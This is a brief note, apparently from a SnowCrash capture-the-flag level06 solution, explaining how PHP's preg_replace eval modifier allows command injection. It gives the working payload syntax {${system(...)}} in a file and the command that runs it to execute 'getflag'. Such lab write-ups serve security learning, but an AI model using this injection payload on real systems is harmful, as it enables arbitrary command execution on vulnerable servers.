e (PREG_REPLACE_EVAL)


tried :
[ x ${system("ls")}] : some php parsing error
the trick was to put bracket {} before ${} (  {${system(ls)}}  )
it is because of the quotes "

second argument of level06 executable take a string, notice that the function x() take 2 arguments
the 2nd argument of this function is also pass to the executable (let's see in the dump)

level06@SnowCrash:~$ cat /var/tmp/level06.php
[x {${system($z)}}]

./level06 /var/tmp/level06.php "getflag"
